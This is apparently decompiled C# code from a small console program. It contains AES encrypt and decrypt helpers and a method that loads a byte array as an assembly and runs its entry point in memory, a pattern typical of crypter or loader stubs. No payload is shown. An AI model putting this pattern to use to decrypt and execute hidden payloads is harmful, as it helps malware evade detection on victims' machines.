using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace ConsoleApp1
{
	// Token: 0x0200000F RID: 15
	internal class Class21
	{
		// Token: 0x0600001B RID: 27 RVA: 0x000029E0 File Offset: 0x00000BE0
		public static byte[] EncryptBytes(byte[] plaintext, byte[] key, byte[] iv)
		{
			byte[] result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = key;
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						cryptoStream.Write(plaintext, 0, plaintext.Length);
						cryptoStream.FlushFinalBlock();
						result = memoryStream.ToArray();
					}
				}
			}
			return result;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002A88 File Offset: 0x00000C88
		public static byte[] DecryptBytes(byte[] ciphertext, byte[] key, byte[] iv)
		{
			byte[] result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = key;
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						cryptoStream.Write(ciphertext, 0, ciphertext.Length);
						cryptoStream.FlushFinalBlock();
						result = memoryStream.ToArray();
					}
				}
			}
			return result;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002B30 File Offset: 0x00000D30
		public static void WhatIsThis(byte[] ciphertext)
		{
			string[] array = new string[0];
			Assembly assembly = Assembly.Load(ciphertext);
			try
			{
				assembly.EntryPoint.Invoke(null, new object[]
				{
					array
				});
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
			}
		}
	}
}
